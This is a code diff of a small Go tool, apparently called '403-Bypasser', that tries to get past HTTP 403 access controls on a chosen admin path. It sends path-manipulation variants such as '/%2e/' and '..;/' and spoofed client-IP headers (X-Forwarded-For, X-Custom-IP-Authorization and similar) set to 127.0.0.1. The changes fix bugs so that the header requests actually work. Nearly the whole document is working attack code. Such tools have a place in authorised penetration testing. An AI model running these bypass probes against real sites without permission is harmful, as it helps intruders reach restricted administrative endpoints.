@@ -10,6 +10,7 @@ import (
 func main() {
 	domain := flag.String("url", "https://google.com", "A domain")
 	path := flag.String("path", "admin", "An endpoint")
+	flag.Parse()
 
 	var Red = "\033[31m"
 	var Green = "\033[32m"
@@ -17,35 +18,46 @@ func main() {
 
 	endpoint := []string{*domain + "/%2e/" + *path, *domain + "/" + *path + "..;/", *domain + "/" + *path + "/.", *domain + "//" + *path + "//", *domain + "/./" + *path + "/./"}
 	headers := []string{"X-Custom-IP-Authorization", "X-Originating-IP", "X-Forwarded-For", "X-Remote-IP", "X-Client-IP", "X-Host", "X-Forwarded-Host"}
-	flag.Parse()
+	fmt.Println(Green, " _  _    ___ ____        ____                                      ")
+	fmt.Println(Green, "| || |  / _ \\___ \\      |  _ \\                                     ")
+	fmt.Println(Green, "| || |_| | | |__) |_____| |_) |_   _ _ __   __ _ ___ ___  ___ _ __ ")
+	fmt.Println(Green, "|__   _| | | |__ <______|  _ <| | | | '_ \\ / _` / __/ __|/ _ \\ '__|")
+	fmt.Println(Green, "   | | | |_| |__) |     | |_) | |_| | |_) | (_| \\__ \\__ \\  __/ |   ")
+	fmt.Println(Green, "   |_|  \\___/____/      |____/ \\__, | .__/ \\__,_|___/___/\\___|_|   ")
+	fmt.Println(Green, "                                __/ | |                            ")
+	fmt.Println(Green, "                               |___/|_|                          v1.0.1", White)
 
-	fmt.Println("Domain:", *domain)
+	fmt.Println("\nDomain:", *domain)
 	fmt.Println("Path:", *path)
 
 	fmt.Println("\nNormal Request")
 	for i, str := range endpoint {
-		resp, err := http.Get(str)
+		req, err := http.Get(str)
 		if err != nil {
 			log.Fatal(err)
 		}
-		if resp.StatusCode == 200 && resp.ContentLength != 0 {
-			fmt.Println(Green, i+1, str, resp.StatusCode, http.StatusText(resp.StatusCode), White)
+		if req.StatusCode == 200 {
+			fmt.Println(Green, i+1, str, req.StatusCode, http.StatusText(req.StatusCode), White)
 		} else {
-			fmt.Println(Red, i+1, str, resp.StatusCode, http.StatusText(resp.StatusCode), White)
+			fmt.Println(Red, i+1, str, req.StatusCode, http.StatusText(req.StatusCode), White)
 		}
 	}
 
 	fmt.Println("\nRequest with Headers")
 	for j, head := range headers {
-		resp, err := http.Get(*domain)
+		req2, err := http.NewRequest("GET", *domain+"/"+*path, nil)
 		if err != nil {
 			log.Fatal(err)
 		}
-		resp.Header.Set(head, "127.0.0.1")
-		if resp.StatusCode == 200 && resp.ContentLength != 0 {
-			fmt.Println(Green, j+1, head, *domain, resp.StatusCode, http.StatusText(resp.StatusCode), White)
+		req2.Header.Set(head, "127.0.0.1")
+		resp, err := http.DefaultClient.Do(req2)
+		if err != nil {
+			log.Fatal(err)
+		}
+		if resp.StatusCode == 200 {
+			fmt.Println(Green, j+1, head, *domain+"/"+*path, resp.StatusCode, http.StatusText(resp.StatusCode), White)
 		} else {
-			fmt.Println(Red, j+1, head, *domain, resp.StatusCode, http.StatusText(resp.StatusCode), White)
+			fmt.Println(Red, j+1, head, *domain+"/"+*path, resp.StatusCode, http.StatusText(resp.StatusCode), White)
 		}
 
 	}
